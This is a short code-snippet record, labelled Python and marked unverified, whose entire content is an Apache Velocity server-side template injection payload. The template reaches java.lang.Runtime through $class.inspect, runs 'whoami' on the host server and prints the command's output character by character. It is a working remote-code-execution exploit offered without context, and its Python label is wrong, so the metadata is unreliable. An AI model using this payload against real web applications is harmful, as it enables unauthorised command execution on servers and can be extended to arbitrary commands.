---
id: f4a4bd23-2bb2-4bc8-be66-2f345bb56780
type: code
language: Python
verified: false
created_at: '2023-04-06T03:56:40.379518+00:00'
updated_at: '2023-04-10T20:23:46.696461+00:00'
---

# Code Snippet f4a4bd23

**Language**: Python

```python
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
